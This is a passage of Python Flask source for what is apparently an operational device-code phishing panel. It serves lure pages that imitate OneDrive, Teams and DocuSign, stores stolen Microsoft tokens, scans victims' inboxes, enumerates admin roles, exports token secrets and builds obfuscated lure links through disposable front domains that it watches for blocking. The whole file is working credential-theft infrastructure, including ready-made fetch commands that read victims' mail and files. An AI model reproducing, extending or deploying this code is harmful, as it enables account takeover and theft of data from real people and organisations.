    return jsonify({"status": job["status"]})


# ─── Settings APIs ────────────────────────────────────────────────────

@app.route("/admin/api/settings", methods=["GET"])
def api_settings_get():
    """Return current settings (safe — no raw passwords)."""
    denied = _require_admin()
    if denied:
        return denied
    tg_config = load_telegram_config()
    return jsonify({
        "server": {
            "port": LISTEN_PORT,
            "domain": SERVER_DOMAIN,
            "ssl_letsencrypt": CFG["server"]["ssl"].get("letsencrypt", False),
            "ssl_cert_exists": os.path.exists(CFG["server"]["ssl"].get("le_cert", "")),
        },
        "turnstile": {
            "enabled": TURNSTILE_ENABLED,
            "has_keys": bool(TURNSTILE_SITE_KEY and TURNSTILE_SECRET_KEY),
        },
        "protection": {
            "rate_limit": f"{RATE_MAX} req / {RATE_WINDOW}s",
            "admin_ips": ADMIN_IPS if ADMIN_IPS else "open",
            "anti_fingerprint": ANTI_FP,
            "session_ttl": f"{SESSION_TTL // 60} min",
            "bot_patterns": len(BOT_PATTERNS),
        },
        "telegram": {
            "enabled": tg_config.get("TELEGRAM_ENABLED") == "true",
            "bot_token": tg_config.get("TELEGRAM_BOT_TOKEN", "")[:12] + "..." if tg_config.get("TELEGRAM_BOT_TOKEN") else "",
            "chat_id": tg_config.get("TELEGRAM_CHAT_ID", ""),
        },
        "stats": {
            "tokens_captured": len(_read_tokens()),
            "sessions_active": sum(1 for s in sessions.values() if s.get("status") == "active"),
            "rate_limit_ips": len(rate_limits),
        },
    })


@app.route("/admin/api/settings", methods=["PATCH"])
def api_settings_update():
    """Update individual settings in config.yaml."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json()
    if not data:
        return jsonify({"error": "JSON body required"}), 400
    try:
        import yaml
        with open(CONFIG_PATH) as f:
            cfg = yaml.safe_load(f) or {}

        # Apply allowed updates
        if "rate_limit_max" in data:
            cfg.setdefault("protection", {}).setdefault("rate_limit", {})["max_requests"] = int(data["rate_limit_max"])
        if "rate_limit_window" in data:
            cfg.setdefault("protection", {}).setdefault("rate_limit", {})["window_seconds"] = int(data["rate_limit_window"])
        if "session_ttl" in data:
            cfg.setdefault("protection", {})["session_ttl_minutes"] = int(data["session_ttl"])
        if "anti_fingerprint" in data:
            cfg.setdefault("protection", {})["anti_fingerprint"] = bool(data["anti_fingerprint"])
        if "turnstile_enabled" in data:
            cfg.setdefault("turnstile", {})["enabled"] = bool(data["turnstile_enabled"])
        if "turnstile_site_key" in data:
            cfg.setdefault("turnstile", {})["site_key"] = str(data["turnstile_site_key"])
        if "turnstile_secret_key" in data:
            cfg.setdefault("turnstile", {})["secret_key"] = str(data["turnstile_secret_key"])

        with open(CONFIG_PATH, "w") as f:
            yaml.dump(cfg, f, default_flow_style=False, sort_keys=False)

        log.info(f"⚙️ Settings updated: {list(data.keys())}")
        return jsonify({"status": "updated", "note": "Restart server for changes to take effect"})
    except ImportError:
        return jsonify({"error": "PyYAML not installed"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/settings/password", methods=["POST"])
def api_settings_password():
    """Change admin password."""
    denied = _require_admin()
    if denied:
        return denied
    global ADMIN_PASSWORD
    data = request.get_json()
    current = data.get("current", "")
    new_password = data.get("new_password", "")
    if not new_password or len(new_password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    if current != ADMIN_PASSWORD:
        return jsonify({"error": "Current password is incorrect"}), 403
    try:
        import yaml
        with open(CONFIG_PATH) as f:
            cfg = yaml.safe_load(f) or {}
        cfg.setdefault("admin", {})["password"] = new_password
        with open(CONFIG_PATH, "w") as f:
            yaml.dump(cfg, f, default_flow_style=False, sort_keys=False)
        ADMIN_PASSWORD = new_password
        log.info("🔒 Admin password changed")
        return jsonify({"status": "password_changed"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/settings/telegram", methods=["POST"])
def api_settings_telegram():
    """Update Telegram bot token and chat ID."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json()
    bot_token = data.get("bot_token", "").strip()
    chat_id = data.get("chat_id", "").strip()
    enabled = data.get("enabled", True)
    try:
        with open(TELEGRAM_CONFIG, "w") as f:
            f.write(f'TELEGRAM_ENABLED={"true" if enabled else "false"}\n')
            f.write(f'TELEGRAM_BOT_TOKEN="{bot_token}"\n')
            f.write(f'TELEGRAM_CHAT_ID="{chat_id}"\n')
        log.info(f"📱 Telegram config updated (enabled={enabled})")
        return jsonify({"status": "updated"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/settings/telegram/test", methods=["POST"])
def api_settings_telegram_test():
    """Send a test Telegram notification."""
    denied = _require_admin()
    if denied:
        return denied
    send_telegram_alert("🧪 *Test notification* from Device Code Lab admin panel")
    return jsonify({"status": "sent"})


# ─── TOTP Management APIs ─────────────────────────────────────────────

@app.route("/admin/api/settings/totp/setup", methods=["POST"])
def api_totp_setup():
    """Generate a new TOTP secret for admin 2FA. Returns otpauth URI for QR code."""
    denied = _require_admin()
    if denied:
        return denied
    try:
        import pyotp, qrcode, io, base64 as _b64
    except ImportError:
        return jsonify({"error": "pyotp not installed — run: pip install pyotp qrcode[pil]"}), 500
    secret = _totp_generate_secret()
    totp = pyotp.TOTP(secret)
    domain = SERVER_DOMAIN or "hednick-panel"
    uri = totp.provisioning_uri(name="admin", issuer_name=domain)
    # Generate QR code as base64 PNG
    try:
        img = qrcode.make(uri)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        qr_b64 = _b64.b64encode(buf.getvalue()).decode()
    except Exception:
        qr_b64 = ""
    audit("totp_setup", detail="admin 2FA TOTP secret generated")
    log.info("🔐 Admin TOTP 2FA configured")
    return jsonify({"secret": secret, "uri": uri, "qr_png_b64": qr_b64})

@app.route("/admin/api/settings/totp/disable", methods=["POST"])
def api_totp_disable():
    """Remove TOTP secret, disabling admin 2FA."""
    denied = _require_admin()
    if denied:
        return denied
    if os.path.exists(TOTP_SECRET_FILE):
        os.remove(TOTP_SECRET_FILE)
        audit("totp_disable", detail="admin 2FA TOTP disabled")
        log.info("🔓 Admin TOTP 2FA disabled")
    return jsonify({"status": "disabled"})

@app.route("/admin/api/settings/totp/status")
def api_totp_status():
    """Return whether TOTP 2FA is currently configured. Public — login page needs this."""
    return jsonify({"enabled": _totp_secret() is not None})

# ─── Cleanup APIs ─────────────────────────────────────────────────────

@app.route("/admin/api/clear-tokens", methods=["POST"])
def api_clear_tokens():
    """Wipe all captured tokens."""
    denied = _require_admin()
    if denied:
        return denied
    _write_tokens([])
    log.info("🗑️ All tokens cleared")
    return jsonify({"status": "cleared"})


@app.route("/admin/api/clear-sessions", methods=["POST"])
def api_clear_sessions():
    """Clear all in-memory sessions."""
    denied = _require_admin()
    if denied:
        return denied
    with sessions_lock:
        sessions.clear()
    log.info("🗑️ All sessions cleared")
    return jsonify({"status": "cleared"})


# ─── Keyword Monitoring APIs ─────────────────────────────────────────

KEYWORDS_FILE = os.path.join(DATA_DIR, "keywords.json")
keyword_matches = []  # in-memory store of matches
keyword_matches_lock = threading.Lock()

def _load_keywords():
    return store.get_keywords()

def _save_keywords(keywords):
    store.set_keywords(keywords)


@app.route("/admin/api/keywords", methods=["GET"])
def api_keywords_get():
    """List all watched keywords."""
    return jsonify({"keywords": _load_keywords()})


@app.route("/admin/api/keywords", methods=["POST"])
def api_keywords_add():
    """Add a keyword to the watch list."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json()
    keyword = data.get("keyword", "").strip().lower()
    if not keyword:
        return jsonify({"error": "keyword required"}), 400
    keywords = _load_keywords()
    if keyword not in keywords:
        keywords.append(keyword)
        _save_keywords(keywords)
        log.info(f"🔔 Keyword added: {keyword}")
    return jsonify({"keywords": keywords})


@app.route("/admin/api/keywords", methods=["DELETE"])
def api_keywords_delete():
    """Remove a keyword from the watch list."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json()
    keyword = data.get("keyword", "").strip().lower()
    keywords = _load_keywords()
    if keyword in keywords:
        keywords.remove(keyword)
        _save_keywords(keywords)
        log.info(f"🔕 Keyword removed: {keyword}")
    return jsonify({"keywords": keywords})


@app.route("/admin/api/keywords/matches")
def api_keywords_matches():
    """Return recent keyword matches."""
    with keyword_matches_lock:
        return jsonify({"matches": keyword_matches[-100:]})  # last 100


@app.route("/admin/api/keywords/scan", methods=["POST"])
def api_keywords_scan():
    """Manually trigger a keyword scan across all captured inboxes."""
    keywords = _load_keywords()
    if not keywords:
        return jsonify({"error": "no keywords configured"}), 400
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"error": "no captured tokens"}), 400

    new_matches = []
    for i, token in enumerate(reversed(tokens)):
        at = token.get("access_token", "")
        upn = token.get("upn", "unknown")
        if not at:
            continue
        try:
            r = requests.get(
                "https://graph.microsoft.com/v1.0/me/messages?$top=50&$select=subject,bodyPreview,from,receivedDateTime",
                headers={"Authorization": f"Bearer {at}"},
                timeout=15,
            )
            if r.status_code != 200:
                continue
            for msg in r.json().get("value", []):
                text = (msg.get("subject", "") + " " + msg.get("bodyPreview", "")).lower()
                for kw in keywords:
                    if kw in text:
                        match = {
                            "keyword": kw,
                            "upn": upn,
                            "subject": msg.get("subject", "")[:100],
                            "from": msg.get("from", {}).get("emailAddress", {}).get("address", ""),
                            "date": msg.get("receivedDateTime", ""),
                            "preview": msg.get("bodyPreview", "")[:200],
                            "found_at": now_utc().isoformat(),
                        }
                        new_matches.append(match)
        except Exception:
            continue

    with keyword_matches_lock:
        keyword_matches.extend(new_matches)

    if new_matches:
        log.info(f"🔔 Keyword scan: {len(new_matches)} matches found")
        # Send Telegram summary
        summary = "\n".join([f"• `{m['keyword']}` in `{m['subject'][:40]}` ({m['upn']})" for m in new_matches[:10]])
        send_telegram_alert(f"🔔 *Keyword Alert* — {len(new_matches)} matches\n\n{summary}")

    return jsonify({"matches_found": len(new_matches), "matches": new_matches})


# ─── Domain Shield / Redirector APIs ─────────────────────────────────

import hmac as _hmac

REDIRECTORS_FILE = os.path.join(DATA_DIR, "redirectors.json")
redirectors_lock = threading.Lock()
redirector_visits = []  # in-memory visit log from webhooks
redirector_visits_lock = threading.Lock()

def _load_redirectors():
    with redirectors_lock:
        if os.path.exists(REDIRECTORS_FILE):
            with open(REDIRECTORS_FILE) as f:
                return json.load(f)
        return []

def _save_redirectors(redirectors):
    with redirectors_lock:
        with open(REDIRECTORS_FILE, "w") as f:
            json.dump(redirectors, f, indent=2)


# ─── Generated Links Persistence ────
LINKS_PATH = os.path.join(DATA_DIR, "generated_links.json")
links_lock = threading.Lock()

def _load_links():
    with links_lock:
        if os.path.exists(LINKS_PATH):
            try:
                with open(LINKS_PATH) as f:
                    return json.load(f)
            except:
                return []
        return []

def _save_links(links):
    with links_lock:
        with open(LINKS_PATH, "w") as f:
            json.dump(links, f, indent=2)


# Import burn detector
try:
    from burn_detector import BurnDetector, full_health_check
    _burn_detector_available = True
except ImportError:
    _burn_detector_available = False
    log.warning("⚠️  burn_detector not available")


def _get_redirector_domains():
    return _load_redirectors()

def _update_redirector_status(domain, status, check_result):
    redirectors = _load_redirectors()
    for r in redirectors:
        if r["domain"] == domain:
            r["status"] = status
            r["last_check"] = check_result.get("timestamp", "")
            r["last_check_detail"] = check_result
            break
    _save_redirectors(redirectors)

def _alert_burned_domain(domain, reason):
    """Send Telegram alert when a domain is burned."""
    log.warning(f"🔴 DOMAIN BURNED: {domain} — {reason}")
    # Re-use existing Telegram alert if configured
    try:
        tg_token = CFG.get("telegram", {}).get("bot_token", "")
        tg_chat = CFG.get("telegram", {}).get("chat_id", "")
        if tg_token and tg_chat:
            msg = f"🔴 DOMAIN BURNED\n\nDomain: {domain}\nReason: {reason}\nTime: {datetime.now(timezone.utc).strftime('%H:%M UTC')}"
            requests.post(
                f"https://api.telegram.org/bot{tg_token}/sendMessage",
                json={"chat_id": tg_chat, "text": msg, "parse_mode": "HTML"},
                timeout=5
            )
    except Exception:
        pass

# Start burn detector if available
if _burn_detector_available:
    burn_detector = BurnDetector(
        get_domains_fn=_get_redirector_domains,
        update_status_fn=_update_redirector_status,
        alert_fn=_alert_burned_domain,
        check_interval=1800,  # 30 minutes
    )
    burn_detector.start()
else:
    burn_detector = None


@app.route("/admin/api/redirectors", methods=["GET"])
def api_list_redirectors():
    """List all registered front domains with status."""
    redirectors = _load_redirectors()
    return jsonify({"redirectors": redirectors})


@app.route("/admin/api/redirectors", methods=["POST"])
def api_add_redirector():
    """Register a new front domain."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json(silent=True) or {}
    domain = data.get("domain", "").strip().lower()
    if not domain:
        return jsonify({"error": "domain required"}), 400

    # Remove protocol if provided
    domain = domain.replace("https://", "").replace("http://", "").rstrip("/")

    redirectors = _load_redirectors()

    # Check duplicate
    if any(r["domain"] == domain for r in redirectors):
        return jsonify({"error": "domain already registered"}), 409

    entry = {
        "domain": domain,
        "status": "active",
        "added_at": datetime.now(timezone.utc).isoformat(),
        "links_generated": 0,
        "visits": 0,
        "captures": 0,
        "last_check": "",
        "last_check_detail": {},
    }
    redirectors.append(entry)
    _save_redirectors(redirectors)

    log.info(f"🛡️ Redirector added: {domain}")
    return jsonify({"status": "added", "redirector": entry})


@app.route("/admin/api/redirectors/<domain>", methods=["DELETE"])
def api_delete_redirector(domain):
    """Remove a front domain."""
    denied = _require_admin()
    if denied:
        return denied
    redirectors = _load_redirectors()
    redirectors = [r for r in redirectors if r["domain"] != domain]
    _save_redirectors(redirectors)
    log.info(f"🗑️ Redirector removed: {domain}")
    return jsonify({"status": "deleted"})


@app.route("/admin/api/redirectors/gen-link", methods=["POST"])
def api_generate_link():
    """Generate a lure link via a front domain."""
    data = request.get_json(silent=True) or {}
    lure = data.get("lure", "share")
    code = data.get("code", "")
    target_domain = data.get("domain", "")  # specific front domain, or auto-pick

    redirectors = _load_redirectors()
    active = [r for r in redirectors if r["status"] == "active"]

    if not active:
        return jsonify({"error": "No active front domains. Add one first."}), 400

    # Pick specific domain or auto-select healthiest
    if target_domain:
        selected = next((r for r in active if r["domain"] == target_domain), None)
        if not selected:
            return jsonify({"error": f"Domain {target_domain} not found or not active"}), 404
    else:
        # Pick the one with fewest links generated (distribute load)
        selected = min(active, key=lambda r: r.get("links_generated", 0))

    # Build the encrypted token payload
    panel_url = f"https://{SERVER_DOMAIN}" if SERVER_DOMAIN else PANEL_URL if 'PANEL_URL' in dir() else "https://hednickbrother.com"
    # Tag link with operator
    current = _get_current_operator()

    payload = {
        "lure": lure,
        "code": code,
        "panel": panel_url,
        "created": int(time.time()),
        "max_uses": data.get("max_uses", 5),
        "ttl_hours": data.get("ttl_hours", 168),
        "op": current["operator_id"],
    }

    # Encode token (same logic as redirector/app.py)
    shared_secret = CFG.get("redirector", {}).get("secret", "blessedhands-shield-2026")
    raw = json.dumps(payload, separators=(",", ":")).encode()
    key = hashlib.sha256(shared_secret.encode()).digest()
    obfuscated = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
    sig = _hmac.new(key, raw, hashlib.sha256).digest()[:8]
    combined = sig + obfuscated
    token = base64.urlsafe_b64encode(combined).rstrip(b"=").decode()

    link = f"https://{selected['domain']}/s/{token}"

    # Store link for management
    import datetime as _dt
    link_record = {
        "id": token[:12],
        "link": link,
        "domain": selected["domain"],
        "lure": lure,
        "ttl_hours": data.get("ttl_hours", 168),
        "max_uses": data.get("max_uses", 5),
        "created_at": _dt.datetime.utcnow().isoformat() + "Z",
        "status": "active",
        "clicks": 0,
        "operator_id": current["operator_id"],
        "operator_name": current["username"],
    }
    links = _load_links()
    links.insert(0, link_record)
    _save_links(links)

    # Update link count
    for r in redirectors:
        if r["domain"] == selected["domain"]:
            r["links_generated"] = r.get("links_generated", 0) + 1
    _save_redirectors(redirectors)

    log.info(f"🔗 Link generated via {selected['domain']}: {lure} (code={code[:8]}...)")
    return jsonify({
        "link": link,
        "domain": selected["domain"],
        "lure": lure,
        "ttl_hours": data.get("ttl_hours", 168),
        "max_uses_per_visitor": data.get("max_uses", 5),
    })


@app.route("/admin/api/redirectors/links", methods=["GET"])
def api_list_links():
    """List all generated links (filtered by operator)."""
    links = _load_links()
    current = _get_current_operator()
    if current["role"] != "admin":
        links = [l for l in links if l.get("operator_id", "admin") == current["operator_id"]]
    return jsonify({"links": links})

@app.route("/admin/api/redirectors/links/<link_id>", methods=["DELETE"])
def api_delete_link(link_id):
    """Delete a generated link."""
    links = _load_links()
    links = [l for l in links if l.get("id") != link_id]
    _save_links(links)
    return jsonify({"ok": True})

@app.route("/admin/api/redirectors/links/<link_id>/revoke", methods=["POST"])
def api_revoke_link(link_id):
    """Revoke a generated link (mark as inactive)."""
    links = _load_links()
    for l in links:
        if l.get("id") == link_id:
            l["status"] = "revoked"
    _save_links(links)
    return jsonify({"ok": True})


@app.route("/admin/api/redirectors/health", methods=["GET"])
def api_redirector_health():
    """Run health checks on all front domains."""
    redirectors = _load_redirectors()
    results = []

    for r in redirectors:
        if _burn_detector_available:
            check = full_health_check(r["domain"])
        else:
            # Basic check fallback
            check = {"domain": r["domain"], "status": "unknown", "checks": {}}
        results.append(check)

        # Update stored status
        r["status"] = check.get("status", r["status"])
        r["last_check"] = check.get("timestamp", "")

    _save_redirectors(redirectors)
    return jsonify({"results": results})


@app.route("/admin/api/redirectors/webhook", methods=["POST"])
def api_redirector_webhook():
    """Receive visit data from a front domain redirector."""
    data = request.get_json(silent=True) or {}

    # Verify webhook signature
    shared_secret = CFG.get("redirector", {}).get("secret", "blessedhands-shield-2026")
    sig_received = request.headers.get("X-BH-Signature", "")
    sig_expected = _hmac.new(
        shared_secret.encode(),
        json.dumps(data).encode(),
        hashlib.sha256
    ).hexdigest()

    if not _hmac.compare_digest(sig_received, sig_expected):
        return jsonify({"error": "invalid signature"}), 403

    # Store visit
    with redirector_visits_lock:
        redirector_visits.append(data)
        # Keep last 1000 visits
        if len(redirector_visits) > 1000:
            redirector_visits.pop(0)

    # Update redirector stats
    front_domain = data.get("front_domain", "")
    action = data.get("action", "")
    if front_domain:
        redirectors = _load_redirectors()
        for r in redirectors:
            if r["domain"] == front_domain:
                r["visits"] = r.get("visits", 0) + 1
                if action == "redirected":
                    r["captures"] = r.get("captures", 0) + 1
                break
        _save_redirectors(redirectors)

    return jsonify({"status": "received"})


@app.route("/admin/api/redirectors/visits", methods=["GET"])
def api_redirector_visits():
    """Get recent visit data from all front domains."""
    with redirector_visits_lock:
        return jsonify({"visits": list(reversed(redirector_visits[-100:]))})


# ─── Lures API ────────────────────────────────────────────────────────

@app.route("/admin/api/lures")
def api_lures():
    """List all lure pages with per-lure stats."""
    lure_stats = {}
    with sessions_lock:
        for code, s in sessions.items():
            pretext = s.get("pretext", "share")
            if pretext not in lure_stats:
                lure_stats[pretext] = {"visits": 0, "captures": 0}
            lure_stats[pretext]["visits"] += 1
            if s.get("status") == "captured":
                lure_stats[pretext]["captures"] += 1

    lures = [
        {"name": "OneDrive", "path": "/share", "pretext": "share",
         "description": "OneDrive file sharing page",
         "visits": lure_stats.get("share", {}).get("visits", 0),
         "captures": lure_stats.get("share", {}).get("captures", 0)},
        {"name": "Teams", "path": "/teams", "pretext": "teams",
         "description": "Microsoft Teams meeting invite",
         "visits": lure_stats.get("teams", {}).get("visits", 0),
         "captures": lure_stats.get("teams", {}).get("captures", 0)},
        {"name": "Security", "path": "/secure", "pretext": "secure",
         "description": "Microsoft security verification",
         "visits": lure_stats.get("secure", {}).get("visits", 0),
         "captures": lure_stats.get("secure", {}).get("captures", 0)},
        {"name": "DocuSign", "path": "/docusign", "pretext": "docusign",
         "description": "DocuSign document signing",
         "visits": lure_stats.get("docusign", {}).get("visits", 0),
         "captures": lure_stats.get("docusign", {}).get("captures", 0)},
    ]
    return jsonify({"lures": lures})


# ─── Domain Health API ────────────────────────────────────────────────

@app.route("/admin/api/domains/health")
def api_domain_health():
    """Check domain DNS and SSL status."""
    import socket
    import ssl as ssl_lib

    domain = SERVER_DOMAIN
    result = {
        "domain": domain,
        "dns_resolves": False,
        "ip": "",
        "ssl_valid": False,
        "ssl_issuer": "",
        "ssl_expiry": "",
        "port_open": False,
    }

    if not domain:
        return jsonify(result)

    # DNS check
    try:
        ip = socket.gethostbyname(domain)
        result["dns_resolves"] = True
        result["ip"] = ip
    except socket.gaierror:
        return jsonify(result)

    # Port check
    try:
        sock = socket.create_connection((domain, 443), timeout=5)
        result["port_open"] = True
        sock.close()
    except Exception:
        pass

    # SSL check
    try:
        ctx = ssl_lib.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(5)
            s.connect((domain, 443))
            cert = s.getpeercert()
            result["ssl_valid"] = True
            result["ssl_issuer"] = dict(x[0] for x in cert.get("issuer", [()])).get("organizationName", "")
            result["ssl_expiry"] = cert.get("notAfter", "")
    except Exception:
        pass

    return jsonify(result)


# ─── Scan All Roles API ──────────────────────────────────────────────

@app.route("/admin/api/scan-all-roles", methods=["POST"])
def api_scan_all_roles():
    """Scan all captured tokens for admin roles. Returns combined results."""
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"results": [], "error": "no tokens"}), 404

    results = []
    for i, token in enumerate(reversed(tokens)):
        at = token.get("access_token", "")
        upn = token.get("upn", "unknown")
        name = token.get("name", "")
        if not at:
            results.append({"upn": upn, "name": name, "roles": [], "groups": [], "is_admin": False, "error": "no access token"})
            continue

        headers = {"Authorization": f"Bearer {at}"}
        entry = {"upn": upn, "name": name, "roles": [], "groups": [], "is_admin": False, "licenses": []}

        ADMIN_ROLE_MAP = {
            "62e90394-69f5-4237-9190-012177145e10": "Global Administrator",
            "194ae4cb-b126-40b2-bd5b-6091b380977d": "Security Administrator",
            "29232cdf-9323-42fd-ade2-1d097af3e4de": "Exchange Administrator",
            "f28a1f50-f6e7-4571-818b-6a12f2af6b6c": "SharePoint Administrator",
            "fe930be7-5e62-47db-91af-98c3a49a38b1": "User Administrator",
            "e8611ab8-c189-46e8-94e1-60213ab1f814": "Privileged Role Administrator",
            "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3": "Application Administrator",
            "3a2c62db-5318-420d-8d74-23affee5d9d5": "Intune Administrator",
            "69091246-20e8-4a56-aa4d-066075b2a7a8": "Teams Administrator",
        }

        try:
            r = requests.get(
                "https://graph.microsoft.com/v1.0/me/memberOf?$select=displayName,roleTemplateId,@odata.type",
                headers=headers, timeout=15,
            )
            if r.status_code == 200:
                for member in r.json().get("value", []):
                    otype = member.get("@odata.type", "")
                    mname = member.get("displayName", "")
                    if "directoryRole" in otype:
                        role_tid = member.get("roleTemplateId", "")
                        friendly = ADMIN_ROLE_MAP.get(role_tid, mname)
                        entry["roles"].append({"name": friendly, "roleTemplateId": role_tid})
                        if role_tid == "62e90394-69f5-4237-9190-012177145e10":
                            entry["is_admin"] = True
                    elif "group" in otype:
                        entry["groups"].append(mname)
                if entry["roles"]:
                    entry["is_admin"] = True
        except Exception:
            entry["error"] = "API call failed"

        try:
            r = requests.get(
                "https://graph.microsoft.com/v1.0/me/licenseDetails?$select=skuPartNumber",
                headers=headers, timeout=10,
            )
            if r.status_code == 200:
                entry["licenses"] = [l.get("skuPartNumber", "") for l in r.json().get("value", [])]
        except Exception:
            pass

        results.append(entry)

    admin_count = sum(1 for r in results if r.get("is_admin"))
    log.info(f"🔍 Bulk role scan: {len(results)} tokens, {admin_count} admins found")
    return jsonify({"results": results, "total": len(results), "admins": admin_count})


# ═══════════════════════════════════════════════════════════════════════
# PUBLIC API ENDPOINTS (dashboard polling)
# ═══════════════════════════════════════════════════════════════════════

@app.route("/api/sessions")
def api_sessions():
    """JSON endpoint for live session data — scoped to operator."""
    current = _get_current_operator()
    with sessions_lock:
        session_list = []
        for code, s in sessions.items():
            # Operators only see their own sessions; admin sees all
            if current["role"] != "admin" and s.get("operator_id", "admin") != current["operator_id"]:
                continue
            session_list.append({
                "code": code,
                "status": s.get("status", "unknown"),
                "pretext": s.get("pretext", ""),
                "ip": s.get("ip", ""),
                "upn": s.get("upn", ""),
                "name": s.get("name", ""),
                "tenant": s.get("tenant", ""),
                "created_at": s.get("created_at", ""),
                "captured_at": s.get("captured_at", ""),
            })
    return jsonify({"sessions": list(reversed(session_list))})


@app.route("/admin/api/tokens/export")
def api_tokens_export():
    """Export FULL token data (including secrets) for local backup."""
    tokens = []
    tokens = _safe_load_tokens()
    # Filter by operator
    current = _get_current_operator()
    if current["role"] != "admin":
        tokens = [t for t in tokens if t.get("operator_id", "admin") == current["operator_id"]]
    return jsonify({"tokens": list(reversed(tokens)), "exported_at": now_utc().isoformat(), "count": len(tokens)})


@app.route("/api/tokens")
def api_tokens():
    """JSON endpoint for captured tokens."""
    tokens = []
    if os.path.exists(TOKEN_LOG):
        with open(TOKEN_LOG) as f:
            tokens = json.load(f)
    # Filter by operator
    current = _get_current_operator()
    if current["role"] != "admin":
        tokens = [t for t in tokens if t.get("operator_id", "admin") == current["operator_id"]]
    # Return tokens without the actual token values for the dashboard
    safe_tokens = []
    for t in reversed(tokens):
        safe_tokens.append({
            "user_code": t.get("user_code", ""),
            "upn": t.get("upn", ""),
            "name": t.get("name", ""),
            "tenant_id": t.get("tenant_id", ""),
            "scopes": t.get("scopes", "")[:100],
            "captured_at": t.get("captured_at", ""),
            "last_refreshed": t.get("last_refreshed", ""),
            "pretext": t.get("pretext", ""),
            "source_ip": t.get("source_ip", ""),
            "pivoted": list(t.get("pivoted_tokens", {}).keys()),
            "has_refresh": bool(t.get("refresh_token", "")),
            "operator_id": t.get("operator_id", "admin"),
        })
    return jsonify({"tokens": safe_tokens})


@app.route("/api/stats")
def api_stats():
    """Dashboard statistics."""
    tokens = []
    if os.path.exists(TOKEN_LOG):
        with open(TOKEN_LOG) as f:
            tokens = json.load(f)
    # Filter by operator
    current = _get_current_operator()
    if current["role"] != "admin":
        tokens = [t for t in tokens if t.get("operator_id", "admin") == current["operator_id"]]

    with sessions_lock:
        total_visits = len(sessions)
        active = sum(1 for s in sessions.values() if s["status"] == "active")
        captured = sum(1 for s in sessions.values() if s["status"] == "captured")
        expired = sum(1 for s in sessions.values() if s["status"] == "expired")

    return jsonify({
        "total_visits": total_visits,
        "active_codes": active,
        "captured": captured,
        "expired": expired,
        "total_tokens": len(tokens),
        "conversion_rate": f"{(captured / max(total_visits, 1)) * 100:.1f}%",
    })


@app.route("/api/intel/<upn>")
def api_intel(upn):
    """Return intel dump for a specific user."""
    safe_upn = re.sub(r'[^a-zA-Z0-9@._-]', '_', upn)
    intel_file = os.path.join(INTEL_DIR, f"{safe_upn}_intel.json")
    if os.path.exists(intel_file):
        with open(intel_file) as f:
            return jsonify(json.load(f))
    return jsonify({"error": "not found"}), 404


@app.route("/tokens")
def tokens_page():
    """View captured tokens with browser-console-ready commands."""
    tokens = _read_tokens()
    token_cards = []
    for t in reversed(tokens):
        at = t.get("access_token", "")
        token_cards.append({
            "upn": t.get("upn", "unknown"),
            "name": t.get("name", ""),
            "captured": t.get("captured_at", ""),
            "code": t.get("user_code", ""),
            "pretext": t.get("pretext", "share"),
            "pivots": list(t.get("pivoted_tokens", {}).keys()),
            "emails_cmd": f"fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10&$select=subject,from,receivedDateTime',{{headers:{{'Authorization':'Bearer {at}'}}}}).then(r=>r.json()).then(d=>console.table(d.value.map(m=>({{Subject:m.subject,From:m.from?.emailAddress?.address,Date:m.receivedDateTime}}))))",
            "profile_cmd": f"fetch('https://graph.microsoft.com/v1.0/me',{{headers:{{'Authorization':'Bearer {at}'}}}}).then(r=>r.json()).then(d=>console.log(d))",
            "files_cmd": f"fetch('https://graph.microsoft.com/v1.0/me/drive/root/children?$top=10&$select=name,size',{{headers:{{'Authorization':'Bearer {at}'}}}}).then(r=>r.json()).then(d=>console.table(d.value))",
        })
    return render_template("tokens_debug.html", token_cards=token_cards)


@app.route("/health")
def health():
    return jsonify({"status": "ok", "timestamp": now_utc().isoformat()})


# Catch-all: return 404 for unknown paths (anti-fingerprint)
@app.errorhandler(404)
def not_found(e):
    return "Not Found", 404


# ─── Main ────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("=" * 56)
    log.info("  ⚡ Device Code Lab — Tier One Server")
    log.info(f"  Port:          {LISTEN_PORT}")
    log.info(f"  Domain:        {SERVER_DOMAIN or '(none — raw IP)'}")
    log.info(f"  Turnstile:     {'✅ enabled' if TURNSTILE_ENABLED else '❌ disabled'}")
    log.info(f"  Anti-FP:       {'✅ enabled' if ANTI_FP else '❌ disabled'}")
    if not ADMIN_IPS:
        log.warning("⚠️  ADMIN_IPS is EMPTY — admin login is open to ALL IPs worldwide!")
        log.warning("   Set protection.admin_ips in config.yaml to lock down access.")
    log.info(f"  Admin Lock:    {ADMIN_IPS if ADMIN_IPS else '⚠️  OPEN (all IPs — set admin_ips in config.yaml)'}")
    log.info(f"  Rate Limit:    {RATE_MAX} req / {RATE_WINDOW}s")
    log.info(f"  Config:        {CONFIG_PATH}")
    log.info(f"  Landing:       /share /teams /secure /docusign")
    log.info(f"  Admin:         /admin")
    log.info("=" * 56)

    # Start auto-refresh thread
    refresh_thread = threading.Thread(target=auto_refresh_loop, daemon=True)
    refresh_thread.start()
    log.info("🔄 Token auto-refresh thread started (every 45 min)")

    # Start session cleanup thread
    cleanup_thread = threading.Thread(target=session_cleanup, daemon=True)
    cleanup_thread.start()
    log.info("🧹 Session cleanup thread started (every 5 min)")

    # Resolve SSL certificates via ssl_manager
    ssl_cfg = CFG["server"]["ssl"]
    cert_file = os.path.join(CERT_DIR, os.path.basename(ssl_cfg.get("cert", "server.crt")))
    key_file = os.path.join(CERT_DIR, os.path.basename(ssl_cfg.get("key", "server.key")))
    
    ssl_ctx = ensure_certs(
        domain=SERVER_DOMAIN or "localhost",
        cert_path=cert_file,
        key_path=key_file,
